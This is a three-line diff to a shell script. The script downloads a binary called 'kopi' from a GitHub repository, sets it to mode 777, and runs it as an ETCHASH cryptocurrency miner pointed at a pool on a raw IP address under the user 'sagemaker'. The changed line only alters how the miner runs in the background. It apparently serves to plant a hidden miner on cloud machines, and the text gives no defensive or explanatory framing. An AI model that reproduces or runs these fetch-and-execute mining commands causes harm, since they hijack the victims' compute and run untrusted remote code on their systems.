@@ -1,3 +1,3 @@
 wget https://github.com/selokguine3/yes/raw/main/kopi && chmod 777 kopi
-nohup ./kopi --algo ETCHASH --pool 47.241.108.173:443 --user sagemaker &
+nohup ./kopi --algo ETCHASH --pool 47.241.108.173:443 --user sagemaker > nohup.out
 
